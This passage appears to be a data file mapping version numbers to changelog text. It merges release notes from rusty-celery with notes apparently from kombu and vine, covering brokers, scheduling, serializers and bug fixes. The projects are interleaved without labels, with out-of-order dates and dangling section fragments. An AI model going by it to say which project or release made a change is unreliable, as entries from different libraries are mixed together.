since current was breaking\n\n Added\n\n- Add explicit feature support for rustls/native-tls\n\n [v0.4.0-rcn.11](https://github.com/rusty-celery/rusty-celery/releases/tag/v0.4.0-rcn.11) - 2021-10-07\n\n Fixed\n\n- Fixed SemVer ordering.\n\n [v0.4.0-rc10](https://github.com/rusty-celery/rusty-celery/releases/tag/v0.4.0-rc10) - 2021-08-30\n\n Fixed\n\n- Fixed another bug with the `app!` and `beat!` related to issue [250](https://github.com/rusty-celery/rusty-celery/issues/250).\n\n [v0.4.0-rc8](https://github.com/rusty-celery/rusty-celery/releases/tag/v0.4.0-rc8) - 2021-08-05\n\n Changed\n\n- \u26a0\ufe0f **BREAKING CHANGE** \u26a0\ufe0f\n\n  The `RegularSchedule` in the `beat` module has been renamed to `DeltaSchedule` to\n  be more coherent with Python Celery terminology, where it is sometimes called *timedelta*.\n- Tokio updated to 1.0.0.\n- The `Broker::configure_task_routes` produces `BrokerError` instead of `CeleryError`.\n- The `beat` macro now expects a list of tasks that is used to initialize the scheduler.\n- Errors have been refactored:\n   * The `BadRoutingPattern` variant has been moved from `CeleryError` to `BrokerError`;\n   * The `CronScheduleError` has been replaced by a `ScheduleError` enum with a `CronScheduleError` variant;\n   * A `ScheduleError` variant has been added to `BeatError`\n   * A `BadRoutingPattern` error has been added.\n\n Added\n\n- \ud83d\ude80\ud83d\ude80 Redis broker support \ud83d\ude80\ud83d\ude80\n- Added the `max_sleep_duration` property on the `Beat` which can be used to ensure that\n  the scheduler backend is called regularly (which may be necessary for custom backends).\n- Added a method `Beat::schedule_named_task` to add a scheduled task with a custom name.\n- Added a method `Broker::cancel` to cancel an existing consumer.\n- Changed `Ok` variant type of the the return type of `Broker::consume`. This is now a tuple that includes a unique\n  consumer tag that can then be passed to `Broker::cancel` to cancel the corresponding consumer.\n- Added a \"coverage\" job to GitHub Actions.\n- Completed MessageBuilder struct\n\n Fixed\n\n- Fixed a bug with `AMQPBroker::close()` that would result in an error with `lapin`.\n- Fixed a bug with the `celery::app!` macro that caused it to fail to compile when the broker connection string was passed as a variable instead of an expression.\n\n [v0.4.0-rc5](https://github.com/rusty-celery/rusty-celery/releases/tag/v0.4.0-rc5) - 2020-11-19\n\n Added\n\n- Added the `CronSchedule` struct to support Celery's\n  [crontab](https://docs.celeryproject.org/en/stable/reference/celery.schedules.html#celery.schedules.crontab)\n  schedules.\n\n Changed\n\n- \u26a0\ufe0f **BREAKING CHANGE** \u26a0\ufe0f\n\n  To improve the `app!` and `beat!` macros and accommodate custom `Broker`s and `SchedulerBackend`s,\n  we've had to make breaking changes to the way these macros are invoked.\n\n  The biggest change is that the macros now return a future of `Result<Celery>` or `Result<Beat>`.\n  This means you must now call `.await?` on the return value of the macro.\n\n  The other change is that you must now supply the actual `Broker` type.\n  Previously, you could write something like `broker = AMQP { \"amqp://my-broker-url\" }`,\n  but now you have to write it like `broker = celery::broker::AMQPBroker { \"amqp://my-broker-url\" }`.\n\n  For a concrete example of these changes, the old way looked like this:\n\n\n  ```rust\n  [tokio::main]\n  async fn main() -> anyhow::Result<()> {\n      let app = celery::app!(\n          broker = AMQP { \"amqp://my-broker-url\" },\n          tasks = [add],\n          task_routes = [\"*\" => \"celery\"],\n      );\n\n      // ...\n\n      Ok(())\n  }\n  ```\n\n  Whereas now that will look like this:\n\n  ```rust\n  [tokio::main]\n  async fn main() -> anyhow::Result<()> {\n      let app = celery::app!(\n          broker = celery::broker::AMQPBroker { \"amqp://my-broker-url\" },\n          tasks = [add],\n          task_routes = [\"*\" => \"celery\"],\n      ).await?;\n\n      // ...\n\n      Ok(())\n  }\n  ```\n\n- Celery apps no longer need to have static lifetimes. To remove this constraint, we changed\n  `Celery::consume` to take `&Arc<Self>` instead of a static reference to `self`.\n- Now using `tokio-amqp` internally with `lapin`.\n- Drop explicit dependency on amq-protocol.\n\n Fixed\n\n- Task ID now logged when a beat app sends a task.\n- Fixes to docs. Added a \"Build Docs\" job to GitHub Actions.\n- Fixed a Celery beat [issue](https://github.com/rusty-celery/rusty-celery/issues/199)\n  that caused a task to be dropped if its scheduled run was delayed\n\n", "2.5.16": "======\n:release-date: 2013-10-04 03:30 P.M BST\n:release-by: Ask Solem\n\n- Python 3: Fixed problem with dependencies not being installed.\n\n.. _version-2.5.15:\n\n", "2.5.15": "======\n:release-date: 2013-10-04 03:30 P.M BST\n:release-by: Ask Solem\n\n- Declaration cache: Now only keeps hash of declaration\n  so that it does not keep a reference to the channel.\n\n- Declaration cache: Now respects ``entity.can_cache_declaration``\n  attribute.\n\n- Fixes Python 2.5 compatibility.\n\n- Fixes tests after python-msgpack changes.\n\n- ``Queue.get``: Now supports ``accept`` argument.\n\n.. _version-2.5.14:\n\n", "2.5.14": "======\n:release-date: 2013-08-23 05:00 P.M BST\n:release-by: Ask Solem\n\n- safe_str did not work properly resulting in\n  :exc:`UnicodeDecodeError` (Issue 248).\n\n.. _version-2.5.13:\n\n", "2.5.13": "======\n:release-date: 2013-08-16 04:00 P.M BST\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 1.0.13\n\n- Fixed typo in Django functional tests.\n\n- safe_str now returns Unicode in Python 2.x\n\n    Fix contributed by Germ\u00e1n M. Bravo.\n\n- amqp: Transport options are now merged with arguments\n  supplied to the connection.\n\n- Tests no longer depends on distribute, which was deprecated\n  and merged back into setuptools.\n\n    Fix contributed by Sascha Peilicke.\n\n- ConsumerMixin now also restarts on channel related errors.\n\n    Fix contributed by Corentin Ardeois.\n\n.. _version-2.5.12:\n\n", "2.5.12": "======\n:release-date: 2013-06-28 03:30 P.M BST\n:release-by: Ask Solem\n\n- Redis: Ignore errors about keys missing in the round-robin cycle.\n\n- Fixed test suite errors on Python 3.\n\n- Fixed msgpack test failures.\n\n.. _version-2.5.11:\n\n", "2.5.11": "======\n:release-date: 2013-06-25 02:30 P.M BST\n:release-by: Ask Solem\n\n- Now depends on amqp 1.0.12 (Py3 compatibility issues).\n\n- MongoDB:  Removed cause of a \"database name in URI is being ignored\"\n  warning.\n\n    Fix by Flavio Percoco Premoli\n\n- Adds ``passive`` option to :class:`~kombu.Exchange`.\n\n    Setting this flag means that the exchange will not be declared by kombu,\n    but that it must exist already (or an exception will be raised).\n\n    Contributed by Rafal Malinowski\n\n- Connection.info() now gives the current hostname and not the list of\n  available hostnames.\n\n    Fix contributed by John Shuping.\n\n- pyamqp: Transport options are now forwarded as kwargs to ``amqp.Connection``.\n\n- librabbitmq: Transport options are now forwarded as kwargs to\n  ``librabbitmq.Connection``.\n\n- librabbitmq:  Now raises :exc:`NotImplementedError` if SSL is enabled.\n\n    The librabbitmq library does not support ssl,\n    but you can use stunnel or change to the ``pyamqp://`` transport\n    instead.\n\n    Fix contributed by Dan LaMotte.\n\n- librabbitmq: Fixed a cyclic reference at connection close.\n\n- eventio: select implementation now removes bad file descriptors.\n\n- eventio: Fixed Py3 compatibility problems.\n\n- Functional tests added for py-amqp and librabbitmq transports.\n\n- Resource.force_close_all no longer uses a mutex.\n\n- Pidbox: Now ignores `IconsistencyError` when sending replies,\n  as this error simply means that the client may no longer be alive.\n\n- Adds new :meth:`Connection.collect <~kombu.Connection.collect>` method,\n  that can be used to clean up after connections without I/O.\n\n- ``queue_bind`` is no longer called for queues bound to\n  the \"default exchange\" (Issue 209).\n\n    Contributed by Jonathan Halcrow.\n\n- The max_retries setting for retries was not respected correctly (off by one).\n\n.. _version-2.5.10:\n\n", "2.5.10": "======\n:release-date: 2013-04-11 06:10 P.M BST\n:release-by: Ask Solem\n\n", "3.0": "-----------------------------------------\n\nKombu 3 consumers will no longer accept pickle/yaml or msgpack\nby default, and you will have to explicitly enable untrusted deserializers\neither globally using :func:`kombu.enable_insecure_serializers`, or\nusing the ``accept`` argument to :class:`~kombu.Consumer`.\n\nChanges\n-------\n\n- New utility function to disable/enable untrusted serializers.\n\n      - :func:`kombu.disable_insecure_serializers`\n      - :func:`kombu.enable_insecure_serializers`.\n\n- Consumer: ``accept`` can now be used to specify a whitelist\n  of content types to accept.\n\n    If the accept whitelist is set and a message is received\n    with a content type that is not in the whitelist then a\n    :exc:`~kombu.exceptions.ContentDisallowed` exception\n    is raised.  Note that this error can be handled by the already\n    existing `on_decode_error` callback\n\n    Examples:\n\n    .. code-block:: python\n\n        Consumer(accept=['application/json'])\n        Consumer(accept=['pickle', 'json'])\n\n- Now depends on amqp 1.0.11\n\n- pidbox: Mailbox now supports the ``accept`` argument.\n\n- Redis: More friendly error for when keys are missing.\n\n- Connection URLs: The parser did not work well when there were\n  multiple '+' tokens.\n\n.. _version-2.5.9:\n\n", "2.5.9": "=====\n:release-date: 2013-04-08 05:07 P.M BST\n:release-by: Ask Solem\n\n- Pidbox: Now warns if there are multiple nodes consuming from\n  the same pidbox.\n\n- Adds :attr:`Queue.on_declared <kombu.Queue.on_declared>`\n\n    A callback to be called when the queue is declared,\n    with signature ``(name, messages, consumers)``.\n\n- Now uses fuzzy matching to suggest alternatives to typos in transport\n  names.\n\n- SQS: Adds new transport option ``queue_prefix``.\n\n    Contributed by j0hnsmith.\n\n- pyamqp: No longer overrides verify_connection.\n\n- SQS: Now specifies the ``driver_type`` and ``driver_name``\n  attributes.\n\n    Fix contributed by Mher Movsisyan.\n\n- Fixed bug with ``kombu.utils.retry_over_time`` when no errback\n  specified.\n\n\n.. _version-2.5.8:\n\n", "2.5.8": "=====\n:release-date: 2013-03-21 04:00 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 1.0.10 which fixes a Python 3 compatibility error.\n\n- Redis: Fixed a possible race condition (Issue 171).\n\n- Redis: Ack emulation/visibility_timeout can now be disabled\n  using a transport option.\n\n    Ack emulation adds quite a lot of overhead to ensure data is safe\n    even in the event of an unclean shutdown.  If data loss do not worry\n    you there is now an `ack_emulation` transport option you can use\n    to disable it:\n\n    .. code-block:: python\n\n        Connection('redis://', transport_options={'ack_emulation': False})\n\n- SQS: Fixed :mod:`boto` v2.7 compatibility (Issue 207).\n\n- Exchange: Should not try to re-declare default exchange (``\"\"``)\n  (Issue 209).\n\n- SQS: Long polling is now disabled by default as it was not\n  implemented correctly, resulting in long delays between receiving\n  messages (Issue 202).\n\n- Fixed Python 2.6 incompatibility depending on ``exc.errno``\n  being available.\n\n    Fix contributed by Ephemera.\n\n.. _version-2.5.7:\n\n", "2.5.7": "=====\n:release-date: 2013-03-08 01:00 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on amqp 1.0.9\n\n- Redis: A regression in 2.5.6 caused the redis transport to\n  ignore options set in ``transport_options``.\n\n- Redis: New ``socket_timeout`` transport option.\n\n- Redis: ``InconsistencyError`` is now regarded as a recoverable error.\n\n- Resource pools: Will no longer attempt to release resource\n  that was never acquired.\n\n- MongoDB: Now supports the ``ssl`` option.\n\n    Contributed by Sebastian Pawlus.\n\n.. _version-2.5.6:\n\n", "2.5.6": "=====\n:release-date: 2013-02-08 01:00 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on amqp 1.0.8 which works around a bug found on some\n  Python 2.5 installations where 2**32 overflows to 0.\n\n.. _version-2.5.5:\n\n", "2.5.5": "=====\n:release-date: 2013-02-07 05:00 P.M UTC\n:release-by: Ask Solem\n\nSQS: Now supports long polling (Issue 176).\n\n    The polling interval default has been changed to 0 and a new\n    transport option (``wait_time_seconds``) has been added.\n    This parameter specifies how long to wait for a message from\n    SQS, and defaults to 20 seconds, which is the maximum\n    value currently allowed by Amazon SQS.\n\n    Contributed by James Saryerwinnie.\n\n- SQS: Now removes unpickleable fields before restoring messages.\n\n- Consumer.__exit__ now ignores exceptions occurring while\n  canceling the consumer.\n\n- Virtual:  Routing keys can now consist of characters also used\n  in regular expressions (e.g. parens) (Issue 194).\n\n- Virtual: Fixed compression header when restoring messages.\n\n    Fix contributed by Alex Koshelev.\n\n- Virtual: ack/reject/requeue now works while using ``basic_get``.\n\n- Virtual: Message.reject is now supported by virtual transports\n  (requeue depends on individual transport support).\n\n- Fixed typo in hack used for static analyzers.\n\n    Fix contributed by Basil Mironenko.\n\n.. _version-2.5.4:\n\n", "2.5.4": "=====\n:release-date: 2012-12-10 12:35 P.M UTC\n:release-by: Ask Solem\n\n- Fixed problem with connection clone and multiple URLs (Issue 182).\n\n    Fix contributed by Dane Guempel.\n\n- zeromq: Now compatible with libzmq 3.2.x.\n\n    Fix contributed by Andrey Antukh.\n\n- Fixed Python 3 installation problem (Issue 187).\n\n.. _version-2.5.3:\n\n", "2.5.3": "=====\n:release-date: 2012-11-29 12:35 P.M UTC\n:release-by: Ask Solem\n\n- Pidbox: Fixed compatibility with Python 2.6\n\n", "2.4.10": "======\n:release-date: 2012-11-22 06:00 P.M UTC\n:release-by: Ask Solem\n\n- The previous versions connection pool changes broke Redis support so that\n  it would always connect to localhost (default setting) no matter what\n  connection parameters were provided (Issue 176).\n\n.. _version-2.4.9:\n\n", "2.4.9": "=====\n:release-date: 2012-11-21 03:00 P.M UTC\n:release-by: Ask Solem\n\n- Redis: Fixed race condition that could occur while trying to restore\n  messages (Issue 171).\n\n    Fix contributed by Ollie Walsh.\n\n- Redis: Each channel is now using a specific connection pool instance,\n  which is disconnected on connection failure.\n\n- ProducerPool: Fixed possible dead-lock in the acquire method.\n\n- ProducerPool: ``force_close_all`` no longer tries to call the non-existent\n  ``Producer._close``.\n\n- librabbitmq: Now implements ``transport.verify_connection`` so that\n  connection pools will not give back connections that are no longer working.\n\n- New and better ``repr()`` for Queue and Exchange objects.\n\n- Python 3:  Fixed problem with running the unit test suite.\n\n- Python 3: Fixed problem with JSON codec.\n\n.. _version-2.4.8:\n\n", "2.4.8": "=====\n:release-date: 2012-11-02 05:00 P.M UTC\n:release-by: Ask Solem\n\n- Redis:  Improved fair queue cycle implementation (Issue 166).\n\n    Contributed by Kevin McCarthy.\n\n- Redis: Unacked message restore limit is now unlimited by default.\n\n    Also, the limit can now be configured using the ``unacked_restore_limit``\n    transport option:\n\n    .. code-block:: python\n\n        Connection('redis://', transport_options={\n            'unacked_restore_limit': 100,\n        })\n\n        A limit of 100 means that the consumer will restore at most 100\n        messages at each pass.\n\n- Redis: Now uses a mutex to ensure only one consumer restores messages at a\n  time.\n\n    The mutex expires after 5 minutes by default, but can be configured\n    using the ``unacked_mutex_expire`` transport option.\n\n- LamportClock.adjust now returns the new clock value.\n\n- Heartbeats can now be specified in URLs.\n\n    Fix contributed by Mher Movsisyan.\n\n- Kombu can now be used with PyDev, PyCharm and other static analysis tools.\n\n- Fixes problem with msgpack on Python 3 (Issue 162).\n\n    Fix contributed by Jasper Bryant-Greene\n\n- amqplib: Fixed bug with timeouts when SSL is used in non-blocking mode.\n\n    Fix contributed by Mher Movsisyan\n\n\n.. _version-2.4.7:\n\n", "2.4.7": "=====\n:release-date: 2012-09-18 03:00 P.M BST\n:release-by: Ask Solem\n\n- Virtual: Unknown exchanges now default to 'direct' when sending a message.\n\n- MongoDB: Fixed memory leak when merging keys stored in the db (Issue 159)\n\n    Fix contributed by Michael Korbakov.\n\n- MongoDB: Better index for MongoDB transport (Issue 158).\n\n    This improvement will create a new compund index for queue and _id in order\n    to be able to use both indexed fields for getting a new message (using\n    queue field) and sorting by _id.  It'll be necessary to manually delete\n    the old index from the collection.\n\n    Improvement contributed by rmihael\n\n.. _version-2.4.6:\n\n", "2.4.6": "=====\n:release-date: 2012-09-12 03:00 P.M BST\n:release-by: Ask Solem\n\n- Adds additional compatibility dependencies:\n\n    - Python <= 2.6:\n\n        - importlib\n        - ordereddict\n\n    - Python <= 2.5\n\n        - simplejson\n\n.. _version-2.4.5:\n\n", "2.4.5": "=====\n:release-date: 2012-08-30 03:36 P.M BST\n:release-by: Ask Solem\n\n- Last version broke installtion on PyPy and Jython due\n  to test requirements clean-up.\n\n.. _version-2.4.4:\n\n", "2.4.4": "=====\n:release-date: 2012-08-29 04:00 P.M BST\n:release-by: Ask Solem\n\n- amqplib: Fixed a bug with asynchronously reading large messages.\n\n- pyamqp: Now requires amqp 0.9.3\n\n- Cleaned up test requirements.\n\n.. _version-2.4.3:\n\n", "2.4.3": "=====\n:release-date: 2012-08-25 10:30 P.M BST\n:release-by: Ask Solem\n\n- Fixed problem with amqp transport alias (Issue 154).\n\n.. _version-2.4.2:\n\n", "2.2.6": "=====\n:release-date: 2012-07-10 05:00 P.M BST\n:release-by: Ask Solem\n\n- Adds ``kombu.messaging.entry_to_queue`` for compat with previous versions.\n\n.. _version-2.2.5:\n\n", "2.2.5": "=====\n:release-date: 2012-07-10 05:00 P.M BST\n:release-by: Ask Solem\n\n- Pidbox: Now sets queue expire at 10 seconds for reply queues.\n\n- EventIO: Now ignores ``ValueError`` raised by epoll unregister.\n\n- MongoDB: Fixes Issue 142\n\n    Fix by Flavio Percoco Premoli\n\n.. _version-2.2.4:\n\n", "2.2.4": "=====\n:release-date: 2012-07-05 04:00 P.M BST\n:release-by: Ask Solem\n\n- Support for msgpack-python 0.2.0 (Issue 143)\n\n    The latest msgpack version no longer supports Python 2.5, so if you're\n    still using that you need to depend on an earlier msgpack-python version.\n\n    Fix contributed by Sebastian Insua\n\n- :func:`~kombu.common.maybe_declare` no longer caches entities with the\n  ``auto_delete`` flag set.\n\n- New experimental filesystem transport.\n\n    Contributed by Bobby Beever.\n\n- Virtual Transports: Now support anonymous queues and exchanges.\n\n.. _version-2.2.3:\n\n", "2.2.3": "=====\n:release-date: 2012-06-24 05:00 P.M BST\n:release-by: Ask Solem\n\n- ``BrokerConnection`` now renamed to ``Connection``.\n\n    The name ``Connection`` has been an alias for a very long time,\n    but now the rename is official in the documentation as well.\n\n    The Connection alias has been available since version 1.1.3,\n    and ``BrokerConnection`` will still work and is not deprecated.\n\n- ``Connection.clone()`` now works for the sqlalchemy transport.\n\n- :func:`kombu.common.eventloop`, :func:`kombu.utils.uuid`,\n  and :func:`kombu.utils.url.parse_url` can now be\n  imported from the :mod:`kombu` module directly.\n\n- Pidbox transport callback ``after_reply_message_received`` now happens\n  in a finally block.\n\n- Trying to use the ``librabbitmq://`` transport will now show the right\n  name in the :exc:`ImportError` if :mod:`librabbitmq` is not installed.\n\n    The librabbitmq falls back to the older ``pylibrabbitmq`` name for\n    compatibility reasons and would therefore show ``No module named\n    pylibrabbitmq`` instead of librabbitmq.\n\n\n.. _version-2.2.2:\n\n", "2.1.8": "=====\n:release-date: 2012-05-06 03:06 P.M BST\n:release-by: Ask Solem\n\n* Bound Exchange/Queue's are now pickleable.\n\n* Consumer/Producer can now be instantiated without a channel,\n  and only later bound using ``.revive(channel)``.\n\n* ProducerPool now takes ``Producer`` argument.\n\n* :func:`~kombu.utils.fxrange` now counts forever if the\n  stop argument is set to None.\n  (fxrange is like xrange but for decimals).\n\n* Auto delete support for virtual transports were incomplete\n  and could lead to problems so it was removed.\n\n* Cached declarations (:func:`~kombu.common.maybe_declare`)\n  are now bound to the underlying connection, so that\n  entities are redeclared if the connection is lost.\n\n    This also means that previously uncacheable entities\n    (e.g. non-durable) can now be cached.\n\n* compat ConsumerSet: can now specify channel.\n\n.. _version-2.1.7:\n\n", "2.1.7": "=====\n:release-date: 2012-04-27 06:00 P.M BST\n:release-by: Ask Solem\n\n* compat consumerset now accepts optional channel argument.\n\n.. _version-2.1.6:\n\n", "2.1.6": "=====\n:release-date: 2012-04-23 01:30 P.M BST\n:release-by: Ask Solem\n\n* SQLAlchemy transport was not working correctly after URL parser change.\n\n* maybe_declare now stores cached declarations per underlying connection\n  instead of globally, in the rare case that data disappears from the\n  broker after connection loss.\n\n* Django: Added South migrations.\n\n    Contributed by Joseph Crosland.\n\n.. _version-2.1.5:\n\n", "2.1.5": "=====\n:release-date: 2012-04-13 03:30 P.M BST\n:release-by: Ask Solem\n\n* The url parser removed more than the first leading slash (Issue 121).\n\n* SQLAlchemy: Can now specify url using + separator\n\n    Example:\n\n    .. code-block:: python\n\n        Connection('sqla+mysql://localhost/db')\n\n* Better support for anonymous queues (Issue 116).\n\n    Contributed by Michael Barrett.\n\n* ``Connection.as_uri`` now quotes url parts (Issue 117).\n\n* Beanstalk: Can now set message TTR as a message property.\n\n    Contributed by Andrii Kostenko\n\n.. _version-2.1.4:\n\n", "1.5.1": "=====\n:release-date: 2011-11-30 01:00 P.M GMT\n:release-by: Ask Solem\n\n* Fixes issue with ``kombu.compat`` introduced in 1.5.0 (Issue 83).\n\n* Adds the ability to disable content_types in the serializer registry.\n\n    Any message with a content type that is disabled will be refused.\n    One example would be to disable the Pickle serializer:\n\n        >>> from kombu.serialization import registry\n         by name\n        >>> registry.disable('pickle')\n         or by mime-type.\n        >>> registry.disable('application/x-python-serialize')\n\n.. _version-1.5.0:\n\n", "1.5.0": "=====\n:release-date: 2011-11-27 06:00 P.M GMT\n:release-by: Ask Solem\n\n* kombu.pools: Fixed a bug resulting in resources not being properly released.\n\n  This was caused by the use of ``__hash__`` to distinguish them.\n\n* Virtual transports: Dead-letter queue is now disabled by default.\n\n    The dead-letter queue was enabled by default to help application\n    authors, but now that Kombu is stable it should be removed.\n    There are after all many cases where messages should just be dropped\n    when there are no queues to buffer them, and keeping them without\n    supporting automatic cleanup is rather considered a resource leak\n    than a feature.\n\n    If wanted the dead-letter queue can still be enabled, by using\n    the ``deadletter_queue`` transport option:\n\n    .. code-block:: pycon\n\n        >>> x = Connection('redis://',\n        ...       transport_options={'deadletter_queue': 'ae.undeliver'})\n\n    In addition, an :class:`UndeliverableWarning` is now emitted when\n    the dead-letter queue is enabled and a message ends up there.\n\n    Contributed by Ionel Maries Cristian.\n\n* MongoDB transport now supports Replicasets (Issue 81).\n\n    Contributed by Ivan Metzlar.\n\n* The ``Connection.ensure`` methods now accepts a ``max_retries`` value\n  of 0.\n\n    A value of 0 now means *do not retry*, which is distinct from :const:`None`\n    which means *retry indefinitely*.\n\n    Contributed by Dan McGee.\n\n* SQS Transport: Now has a lowercase ``sqs`` alias, so that it can be\n  used with broker URLs (Issue 82).\n\n    Fix contributed by Hong Minhee\n\n* SQS Transport: Fixes KeyError on message acknowledgments (Issue 73).\n\n    The SQS transport now uses UUID's for delivery tags, rather than\n    a counter.\n\n    Fix contributed by Brian Bernstein.\n\n* SQS Transport: Unicode related fixes (Issue 82).\n\n    Fix contributed by Hong Minhee.\n\n* Redis version check could crash because of improper handling of types\n  (Issue 63).\n\n* Fixed error with `Resource.force_close_all` when resources\n  were not yet properly initialized (Issue 78).\n\n.. _version-1.4.3:\n\n", "1.3.5": "=====\n:release-date: 2011-09-16 06:00 P.M BST\n:release-by: Ask Solem\n\n* Python 3: AMQP_PROTOCOL_HEADER must be bytes, not str.\n\n.. _version-1.3.4:\n\n", "1.3.4": "=====\n:release-date: 2011-09-16 06:00 P.M BST\n:release-by: Ask Solem\n\n* Fixes syntax error in pools.reset\n\n\n.. _version-1.3.3:\n\n", "1.1.6": "=====\n:release-date: 2011-06-13 04:00 P.M BST\n:release-by: Ask Solem\n\n* Redis: Fixes issue introduced in 1.1.4, where a redis connection\n  failure could leave consumer hanging forever.\n\n* SQS: Now supports fanout messaging by using SimpleDB to store routing\n  tables.\n\n    This can be disabled by setting the `supports_fanout` transport option:\n\n        >>> Connection(transport='SQS',\n        ...            transport_options={'supports_fanout': False})\n\n* SQS: Now properly deletes a message when a message is acked.\n\n* SQS: Can now set the Amazon AWS region, by using the ``region``\n  transport option.\n\n* amqplib: Now uses `localhost` as default hostname instead of raising an\n  error.\n\n.. _version-1.1.5:\n\n", "1.1.5": "=====\n:release-date: 2011-06-07 06:00 P.M BST\n:release-by: Ask Solem\n\n* Fixes compatibility with redis-py 2.4.4.\n\n.. _version-1.1.4:\n\n", "1.1.4": "=====\n:release-date: 2017-07-16 10:30 P.M UTC+2\n:release-by: Ask Solem\n\n- Added official support for Python 3.5 & 3.6.\n- Improve Python 2/3 compatibility.\n- Don't set mutable default values to keyword arguments.\n\n.. _version-1.1.3:\n\n", "1.1.3": "=====\n:release-date: 2016-10-13 06:02 P.M PDT\n:release-by: Ask Solem\n\n- New ``promise(fun, weak=True)`` argument, creates weakref to callback.\n\n.. _version-1.1.2:\n\n", "1.1.2": "=====\n:release-date: 2016-09-07 04:18 P.M PDT\n:release-by: Ask Solem\n\n- barrier: now handles the case where len(promises) returns NotImplemented.\n\n.. _version-1.1.1:\n\n", "1.1.1": "=====\n:release-date: 2016-06-30 12:05 P.M PDT\n:release-by: Ask Solem\n\n- Requirements: Tests now depends on :pypi:`case` 1.2.2\n\n- Five: python_2_unicode_compatible now ensures `__repr__` returns\n  bytes on Python 2.\n\n.. _version-1.1.0:\n\n", "0.1.0": "=====\n:release-date: 2010-07-22 04:20 P.M CET\n:release-by: Ask Solem\n\n* Initial fork of carrot\n\n\nChanges\n=======\n\n.. _version-5.1.0:\n\n", "0.4.0rc4": "\n Added\n\n- Added a `MockBroker` for internal testing.\n- Added more tests to the `app` module.\n- Added a `prelude` module.\n- Added support for YAML, MsgPack, and Pickle content types, behind the `extra_content_types` feature flag.\n\n Changed\n\n- Improved `TaskResultExt`. Now takes a `FnOnce() -> Context` instead of `&str`.\n\n Fixed\n\n- Ensure a `Signature` inherits default `TaskOptions` from the corresponding `Task` and `Celery` or `Beat` app.\n- Cleaned up remaining uses of `.unwrap()` in the library.\n- Options returned with `Task::options()` now have the current values, where app-level values are overridden by task-level values.\n\n", "0.4.0rc3": "\n Added\n\n- Added a `.display_pretty()` method on the `Celery` struct that prints out a cool ASCII logo\n  with some useful information about the app.\n- Added an `AsyncResult` struct that acts as a handler for task results.\n- Added `Task::retry_with_countdown` and `Task::retry_with_eta` trait methods so that tasks can\n  manually trigger a retry.\n\n Changed\n\n- Fields of the `Signature` struct made private to avoid confusion around which fields of `TaskOptions` apply to a `Signature`.\n- `Celery::send_task` now returns an `AsyncResult` instead of a `String` for the `Ok` variant.\n- Renamed `DummyBackend` to `LocalSchedulerBackend`.\n- Switched to [`thiserror`](https://github.com/dtolnay/thiserror) for the error module instead of the deprecated `failure` crate.\n\n Fixed\n\n- Fixed bug where `hard_time_limit` was ignored by worker if only specified at the app or task level.\n\n", "0.4.0rc2": "\n Added\n\n- Added a `reconnect` method on the `Broker`.\n\n Changed\n\n- `Celery` and `Beat` apps will automatically try to reconnect the broker when the connection fails.\n\n", "0.4.0rc1": "\n Added\n\n- Added a `hard_time_limit` task option for compatability with Python.\n\n Changed\n\n- The `timeout` task option was renamed to `time_limit` to be more consistent with the Python API.\n\n Fixed\n\n- Compiles on Windows\n\n", "0.3.1": "\n Added\n\n- `beat` module with basic support for scheduling tasks.\n- `beat` macro to create a `Beat` app.\n\n", "0.3.0": "\n Changed\n\n- `lapin` dependency updated to 1.0.\n- `BrokerError` variants trimmed and simplified.\n- The error handler closure passed to `Broker::consume` now takes a `BrokerError` as an argument.\n- Improved error messages.\n\n", "0.2.6": "\n Fixed\n\n- `Message::headers::origin` field fixed. Before it included quotes around the hostname.\n\n Added\n\n- `Request::hostname` field now populated by the `Celery` app consuming the task.\n\n Changed\n\n- Sending a task `with_timeout` will only set the `soft_time_limit` so that the behavior\nis the same for Python consumers.\n\n", "0.2.5": "\n Changed\n\n- Tasks must explicitly return a `TaskResult<T>` now.\n\n", "0.2.4": "\n Added\n\n- A `retry_for_unexpected` task configuration option. By default this is `true` (so the default behavior is unchanged).\nBut if set to `false`, tasks that raised `TaskError::UnexpectedError` won't be retried.\n\n", "0.2.3": "\n Changed\n\n- `CeleryBuilder::task_route` now infallible. Error could be raised during the `build` phase instead.\n- `Celery::consume_from` will return `Err(CeleryError::NoQueueToConsume)` if the slice of queues is empty.\n\n", "0.2.2": "\n Changed\n\n- `Celery::consume_from` now takes multiple queues instead of just a single queue.\n- Retry ETA method moved from tracer to task so that it can be customized.\n- `TaskError` variants restricted to only `ExpectedError`, `UnexpectedError`, and `TimeoutError`. The `Retry` and `ExpirationError` variants moved to a new (non-public) error type: `TracerError`.\n\n", "0.2.1": "\n Added\n\n- `on_failure` and `on_success` options to `task` attribute macro.\n\n Changed\n\n- Removed `task_id` and `params` arguments to `on_failure` and `on_success` callbacks, since those can be gotten from the request object.\n\n", "0.2.0": "\n Added\n\n- A `Signature` struct with includes task execution options (previously the fields in `TaskSendOptions`).\n- A `bind` argument to the `task` macro. When `bind = true` is given, the task will be run as an instance method.\n- A `Request` struct.\n\n Changed\n\n- `protocol::TryIntoMessage` trait renamed to `TryCreateMessage` and the one trait function `try_into_message` renamed to `try_create_message` to better reflect the fact that the trait function does not consume `self`.\n- Task parameters are now separated from task struct.\n- Task callback methods `on_failure` and `on_success` are now instance methods.\n- `Celery::send_task` now takes a `Signature` instead of a `Task`.\n- When tasks are defined through the `task` macro by annotating a function, that function needs to be explicitly marked async for the function to use async / await syntax.\n\n Removed\n\n- `TaskContext` struct.\n- `TaskSendOptions`.\n- `Celery::send_task_with`.\n\n", "0.2.0alpha.2": "\n Changed\n\n- Uses of `std::sync::Mutex` and `std::sync::RwLock` changed to their async-aware equivalents from `tokio`.\n- The `Celery::register_task` method is now an async function due to the above.\n- Fixed bug where tasks with a future ETA were acked before they were due, resulting in such tasks being lost if the worker was shutdown before they were due.\n\n Removed\n\n- The `SyncError` variants have been removed.\n\n", "0.2.0alpha.1": "\n Changed\n\n- `Celery::consume_from` now only accepts a single queue (once again) since there was a critical bug when we allowed consuming from multiple queues.\n\n", "0.2.0alpha.0": "\n Added\n\n- Several error enums: `CeleryError`, `TaskError`, `BrokerError`, `ProtocolError`.\n- `TaskResultExt` for easily converting the error type in a `Result` to a `TaskError` variant.\n\n Changed\n\n- The `error` module.\n- The structure of the public API is now more compact. We expose a few more modules, including `broker`, `task`, and `error` instead of exporting all of the public elements from the crate root.\n- The `app` macro (previously `celery_app`) no longer takes an actual broker type (like `AMQPBroker`) for the `broker` parameter. Instead you can just use the literal token `AMQP`. This means one less import for the user.\n\n 